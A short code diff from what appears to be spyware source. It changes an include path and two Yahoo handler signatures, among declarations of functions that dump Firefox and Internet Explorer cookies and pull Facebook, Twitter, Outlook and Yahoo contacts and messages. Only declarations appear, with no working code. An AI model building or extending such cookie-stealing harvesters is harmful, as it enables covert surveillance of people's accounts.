@@ -13,7 +13,7 @@
 #include "../../H4DLL/bss.h"
 #include "../../H4DLL/LOG.h"
 #include <json/JSON.h>
-#include "../../H4DLL/bin_string.h"
+#include <rcs/bin_string.h>
 #include "CookieHandler.h"
 #include "SocialMain.h"
 #include "NetworkHandler.h"
@@ -24,8 +24,8 @@ extern DWORD HandleFBContacts(char *); // Handler per FaceBook
 extern DWORD HandleTwitterContacts(char *); // Handler per Twitter
 extern DWORD HandleTwitterTweets(char *); // Handler per Twitter
 extern DWORD HandleOutlookMail(char *); // Handle per Outlook Live
-extern DWORD YahooMessageHandler(char *); // Handler per Yahoo
-extern DWORD YahooContactHandler(char *); // Handler per Yahoo
+extern DWORD YahooMessageHandler(LPSTR strCookie); // Handler per Yahoo
+extern DWORD YahooContactHandler(LPSTR strCookie); // Handler per Yahoo
 
 extern int DumpFFCookies(void); // Cookie per Facebook
 extern int DumpIECookies(const WCHAR *); // Cookie per IExplorer
